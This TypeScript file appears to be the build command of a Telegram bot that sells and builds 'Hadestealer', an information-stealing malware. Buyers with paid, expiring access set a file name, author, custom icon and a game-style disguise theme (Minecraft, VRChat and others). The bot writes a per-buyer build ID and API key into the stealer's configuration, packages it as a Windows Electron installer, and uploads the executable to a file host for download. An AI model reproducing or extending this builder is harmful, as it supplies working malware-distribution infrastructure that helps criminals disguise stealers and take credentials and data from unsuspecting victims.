import Command from '../structures/Command';
import { Context, Markup, Telegraf } from 'telegraf';
import UserAccess from '../models/UserAccess';
import fs from 'fs';
import path from 'path';
import { exec } from 'child_process';
import FormData from 'form-data';
import fetch from 'node-fetch';
import { PassThrough } from 'stream';
import { GOFILE_SETTINGS } from '../config';
import BotClient from '../client/BotClient';
import crypto from 'crypto';

const userStates = new Map<string, string>();

export default class BuildCommand extends Command {
    public name = 'build';
    public description = 'Build and configuration command.';

    public register(bot: Telegraf<Context>, client: BotClient) {
        bot.action('main_menu', async (ctx) => {
            await this.showMainMenu(ctx);
        });

        bot.action('config_menu', async (ctx) => {
            await this.showConfigMenu(ctx);
        });

        bot.action(/^set_(.+)$/, async (ctx) => {
            const field = ctx.match[1];
            const userId = ctx.from?.id.toString();
            if (!userId) return;
            userStates.set(userId, field);

            const fieldLabels: any = {
                name: 'File Name',
                productName: 'Product Name',
                company: 'Author',
                fileDescription: 'Description',
                icon: 'Icon'
            };

            const label = fieldLabels[field] || field;

            if (field === 'icon') {
                await ctx.reply('Please send a valid **.ico** file (Recommended: 256x256).', { parse_mode: 'Markdown' });
            } else {
                await ctx.reply(`Please send the new **${label}** value:`, Markup.forceReply());
            }
            await ctx.answerCbQuery();
        });


        bot.action('start_build_action', async (ctx) => {
            await ctx.answerCbQuery('Build is starting...');
            await this.runBuild(ctx, client);
        });

        bot.on('text', async (ctx, next) => {
            const userId = ctx.from?.id.toString();
            if (userId && userStates.has(userId)) {
                const txt = (ctx.message as any)?.text;
                if (txt && !txt.startsWith('/')) {
                    return await this.execute(ctx);
                }
            }
            return next();
        });

        bot.on(['document', 'photo'], async (ctx, next) => {
            const userId = ctx.from?.id.toString();
            if (userId && userStates.get(userId) === 'icon') {
                return await this.execute(ctx);
            }
            return next();
        });
        bot.action('theme_menu', async (ctx) => {
            await this.showThemeMenu(ctx);
        });
        bot.action(/^select_theme_(.+)$/, async (ctx) => {
            const userId = ctx.from?.id.toString();
            if (!userId) return;

            const selectedTheme = ctx.match[1];
            const access = await UserAccess.findOne({ userId });
            if (!access) return;

            const currentTheme = access.build?.theme;
            const newTheme = currentTheme === selectedTheme ? null : selectedTheme;

            await this.updateConfig(ctx, userId, 'theme', newTheme as any);
            await ctx.answerCbQuery(newTheme ? `Theme set to ${newTheme}` : 'Theme reset to Default');
        });
    }

    private async showThemeMenu(ctx: Context) {
        const userId = ctx.from?.id.toString();
        const access = await UserAccess.findOne({ userId });
        const currentTheme = access?.build?.theme || 'None';

        const themes = ['2DGame', 'KittiesMC', 'Minecraft', 'NormalGame', 'VRChat', 'WatchTV'];

        const themeButtons = [];
        for (let i = 0; i < themes.length; i += 2) {
            const row = themes.slice(i, i + 2).map(theme => {
                const isSelected = currentTheme === theme;
                return Markup.button.callback(
                    `${isSelected ? '✅ ' : ''}${theme}`,
                    `select_theme_${theme}`
                );
            });
            themeButtons.push(row);
        }

        themeButtons.push([Markup.button.callback('⬅️ Back to Setup', 'config_menu')]);

        const text = `🎨 **Theme Selection**\n\n` +
            `Current Theme: \`${currentTheme}\`\n\n` +
            `Select a theme below. Clicking on the active theme will reset it to **Default (No Loading)**.`;

        if (ctx.callbackQuery) {
            await ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(themeButtons) });
        } else {
            await ctx.reply(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(themeButtons) });
        }
    }

    public async execute(ctx: Context) {
        const userId = ctx.from?.id?.toString?.();
        if (!userId) return;

        const message = ctx.message as any;
        const text = message?.text || '';
        const state = userStates.get(userId);
        console.log((ctx.update as any).message.chat)
        if (state === 'icon') {
            const doc = message?.document;

            if (doc) {
                if (!doc.file_name?.toLowerCase().endsWith('.ico')) {
                    await ctx.reply('Please send only a file with the **.ico** extension.');
                    return;
                }

                try {
                    const fileId = doc.file_id;
                    const fileLink = await ctx.telegram.getFileLink(fileId);

                    const uploadsDir = path.join(process.cwd(), 'user_uploads');
                    if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });

                    const iconPath = path.join(uploadsDir, `${userId}.ico`);
                    const response = await fetch(fileLink.href);
                    const buffer = await response.buffer();
                    fs.writeFileSync(iconPath, buffer);

                    await this.updateConfig(ctx, userId, 'icon', `${userId}.ico`);
                    userStates.delete(userId);
                    return;
                } catch (err) {
                    await ctx.reply('An error occurred while saving the icon.');
                    return;
                }
            } else if (text) {
                await ctx.reply('Please send an **.ico** file.');
                return;
            }
        }

        if (state && state !== 'icon') {
            const val = text.trim();
            if (val) {
                await this.updateConfig(ctx, userId, state, val);
                userStates.delete(userId);
                return;
            }
        }

        await this.showMainMenu(ctx);
    }


    private async showMainMenu(ctx: Context) {
        const userId = ctx.from?.id.toString();
        if (!userId) return;

        const access = await UserAccess.findOne({ userId });
        if (!access) {
            await ctx.reply('You don\'t have access. Use a key with /claim <key>.');
            return;
        }

        const build = access.build || {
            name: 'hadestealer',
            version: '1.0.0',
            productName: 'Hadestealer',
            company: 'Hades',
            icon: 'hadestealer.ico'
        };

        const menuText = `📋 **Current Build Configuration**\n\n` +
            `▫️ **File Name:** \`${build.name || 'Not Set'}\`\n` +
            `▫️ **Product Name:** \`${build.productName || 'Not Set'}\`\n` +
            `▫️ **Author:** \`${build.company || 'Not Set'}\`\n` +
            `▫️ **Description:** \`${build.fileDescription || 'Not Set'}\`\n` +
            `▫️ **Icon:** \`${build.icon || 'Default'}\`\n\n` +
            `▫️ **Theme:** \`${build.theme || 'Default (No Loading)'}\`\n` +
            `What would you like to do?`;

        const keyboard = Markup.inlineKeyboard([
            [Markup.button.callback('🚀 Start Building', 'start_build_action')],
            [Markup.button.callback('⚙️ Build Setup', 'config_menu')]
        ]);

        if (ctx.callbackQuery) {
            await ctx.editMessageText(menuText, { parse_mode: 'Markdown', ...keyboard });
        } else {
            await ctx.reply(menuText, { parse_mode: 'Markdown', ...keyboard });
        }
    }


    private async showConfigMenu(ctx: Context) {
        const keyboard = Markup.inlineKeyboard([
            [Markup.button.callback('📝 Set File Name', 'set_name')],
            [Markup.button.callback('🏷️ Set Product Name', 'set_productName')],
            [Markup.button.callback('👤 Set Author', 'set_company')],
            [Markup.button.callback('🖼️ Set Icon', 'set_icon')],
            [Markup.button.callback('📄 Set Description', 'set_fileDescription')],
            [Markup.button.callback('🎨 Select Theme', 'theme_menu')],
            [Markup.button.callback('🔍 Check Current Config', 'main_menu')]
        ]);

        const text = "⚙️ **Build Setup**\n\nPlease configure your build settings using the buttons below:";
        if (ctx.callbackQuery) {
            await ctx.editMessageText(text, { parse_mode: 'Markdown', ...keyboard });
        } else {
            await ctx.reply(text, { parse_mode: 'Markdown', ...keyboard });
        }
    }



    private async updateConfig(ctx: Context, userId: string, field: string, value: string) {
        try {
            const access = await UserAccess.findOne({ userId });
            if (!access) return;

            if (!access.build) {
                (access as any).build = {
                    name: 'hadestealer',
                    version: '1.0.0',
                    productName: 'Hadestealer',
                    fileDescription: 'Hades Stealer',
                    company: 'Hades',
                    legalCopyright: 'Copyright 2024',
                    icon: 'hadestealer.ico',
                    theme: null
                };
            }

            (access.build as any)[field] = value;
            access.markModified('build');
            await access.save();


            await ctx.reply(`✅ **${field}** successfully updated: \`${value}\``, { parse_mode: 'Markdown' });
            await this.showMainMenu(ctx);
        } catch (err) {
            console.log(err)
            await ctx.reply('An unexpected error has occurred. Please contact the seller.');
        }
    }

    private async runBuild(ctx: Context, client: BotClient) {
        if (client?.isBuilding) {
            await ctx.reply('⚠️ Another build is currently in progress. Please wait for it to finish.');
            return;
        }
        console.log(client?.isBuilding)
        const userId = ctx.from?.id?.toString?.();
        if (!userId) return;

        const access = await UserAccess.findOne({ userId });
        if (!access) return;

        const now = new Date();
        if (access.expireAt.getTime() <= now.getTime()) {
            await ctx.reply('Your access has expired.');
            return;
        }
        if (client) client.isBuilding = true;
        console.log(client?.isBuilding)

        const stealerDirCandidates = [
            path.join(process.cwd(), '..', 'Stealer'),
            path.join(__dirname, '..', '..', '..', 'Stealer')
        ];
        let stealerDir: string | null = null;
        for (const c of stealerDirCandidates) {
            if (fs.existsSync(c)) {
                stealerDir = c;
                break;
            }
        }

        if (!stealerDir) {
            await ctx.reply('An unexpected error has occurred. Please contact the seller.');
            return;
        }

        const constantsPath = path.join(stealerDir, 'src', 'config', 'constants.ts');
        try {
            const key = crypto.randomBytes(8).toString('hex');
            const raw = fs.readFileSync(constantsPath, 'utf8');

            let replaced = raw.replace(/export const BUILD_ID\s*=\s*["'`][^"'`]*["'`]\s*;?/, `export const BUILD_ID = "${userId}";`);

            const theme = access?.build.theme ? access.build.theme : "Default";
            replaced = replaced.replace(/export const THEME.*=.*/, `export const THEME = "${theme}";`);

            replaced = replaced.replace(/export const API_KEY\s*=\s*["'`][^"'`]*["'`]\s*;?/, `export const API_KEY = "${key}";`);

            if (!Array.isArray(access.build.key)) {
                access.build.key = [];
            }

            access.build.key.push(key);

            if (typeof access.markModified === 'function') {
                access.markModified('build.key');
            }

            await access.save();
            fs.writeFileSync(constantsPath, replaced, 'utf8');

        } catch (err) {
            console.error("Build Key Error:", err);
            await ctx.reply('An unexpected error has occurred. Please contact the seller.');
            return;
        }

        const pkgPath = path.join(stealerDir, 'package.json');
        const buildData = access.build || {
            name: 'hadestealer',
            version: '1.0.0',
            productName: 'Hadestealer',
            fileDescription: 'Hades Stealer',
            company: 'Hades',
            legalCopyright: 'Copyright 2024',
            icon: 'hadestealer.ico'
        };
        try {
            let activeIconPath = 'src/assets/hadestealer.ico';
            if (buildData.icon && buildData.icon !== 'hadestealer.ico') {
                const userIconPath = path.join(process.cwd(), 'user_uploads', buildData.icon);
                const tempIconPath = path.join(stealerDir, 'src', 'assets', 'temp_build_icon.ico');
                if (fs.existsSync(userIconPath)) {
                    fs.copyFileSync(userIconPath, tempIconPath);
                    activeIconPath = 'src/assets/temp_build_icon.ico';
                }
            }

            if (fs.existsSync(pkgPath)) {
                const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
                pkg.version = buildData.version || pkg.version;
                pkg.description = buildData.fileDescription || pkg.description;
                pkg.productName = buildData.productName || buildData.name || pkg.productName;
                pkg.author = buildData.company || pkg.author;

                if (!pkg.build) pkg.build = {};
                if (!pkg.build.win) pkg.build.win = {};
                pkg.build.win.icon = activeIconPath;

                fs.writeFileSync(pkgPath, JSON.stringify(pkg, null, 2), 'utf8');
            }
        } catch (err) {
            console.log(err)
            await ctx.reply('An unexpected error has occurred. Please contact the seller.');
            return;
        }


        await ctx.reply('Build is starting. Please wait...');

        const cleanup = () => {
            if (client) client.isBuilding = false;

            try {
                const tempIcon = path.join(stealerDir!, 'src', 'assets', 'temp_build_icon.ico');
                if (fs.existsSync(tempIcon)) fs.unlinkSync(tempIcon);
            } catch (e) { }
        };


        exec('npm run package-electron', { cwd: stealerDir, maxBuffer: 1024 * 1024 * 1024, env: { ...process.env, DEBUG: 'electron-builder' } }, async (error, stdout, stderr) => {
            console.log("STDERR:", stderr)
            cleanup();
            if (error) {
                console.error("BUILD HATASI DETAYI:", stderr, error);
                await ctx.reply("An unexpected error has occurred. Please contact the seller.");
                return;
            }
            await ctx.reply('The build is complete. The file will be sent within 10 minutes.');
            try {
                const targetExe = path.join(stealerDir!, 'release', `${buildData.productName} Setup ${buildData.version ?? "1.0.0"}.exe`);
                if (!fs.existsSync(targetExe)) {
                    console.log("targetexe yk", targetExe)
                    await ctx.reply("An unexpected error has occurred. Please contact the seller.");
                    return;
                }


                const chatId = ctx.chat?.id;
                if (!chatId) return;

                const stat = fs.statSync(targetExe);
                const totalSize = stat.size;
                const statusMsg = await ctx.reply('File is being sent: 0%');
                const messageId = (statusMsg as any).message_id;

                const readStream = fs.createReadStream(targetExe);
                const pass = new PassThrough();
                let uploaded = 0;
                let lastUpdate = Date.now();

                const safeEdit = async (text: string) => {
                    try {
                        await ctx.telegram.editMessageText(chatId as any, messageId as any, undefined, text);
                    } catch (e: any) { }
                };

                readStream.on('data', (chunk: Buffer) => {
                    uploaded += chunk.length;
                    const now = Date.now();
                    if (now - lastUpdate > 1000) {
                        const percent = Math.floor((uploaded / totalSize) * 100);
                        void safeEdit(`File is being sent: ${percent}%`);
                        lastUpdate = now;
                    }
                });

                readStream.pipe(pass);

                const form = new FormData();
                form.append('file', pass, { filename: `${access.build.productName || 'hadestealer'}.exe` });

                const headers = Object.assign({}, form.getHeaders(), { Authorization: `Bearer ${GOFILE_SETTINGS.token}` });
                const uploadUrl = 'https://upload.gofile.io/uploadfile';

                const goRes = await fetch(uploadUrl, { method: 'POST', headers, body: form as any });
                const goJson: any = await goRes.json();

                if (goJson && (goJson.status === 'success' || goJson.status === 'ok')) {
                    const link = goJson.data.downloadPage;
                    await safeEdit(`File is being sent: 100%`);
                    await ctx.reply('Build completed! File link: ' + link);
                } else {
                    console.log("goflea yüklenmedi")
                    await ctx.reply(`An unexpected error has occurred. Please contact the seller.`);
                }
            } catch (e) {
                console.log(e)
                await ctx.reply('An unexpected error has occurred. Please contact the seller.');
            }
        });

    }
}

